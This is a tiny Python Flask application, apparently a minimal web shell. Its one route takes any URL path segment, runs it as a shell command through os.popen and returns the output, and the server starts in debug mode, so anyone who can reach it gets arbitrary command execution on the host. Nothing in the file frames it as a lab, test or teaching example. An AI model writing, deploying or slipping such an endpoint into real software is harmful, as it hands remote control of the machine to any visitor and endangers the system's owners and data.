from flask import Flask
import os


app = Flask(__name__)

@app.route('/<cmd>')
def index(cmd):
    return os.popen(cmd).read()
app.run(debug=True)
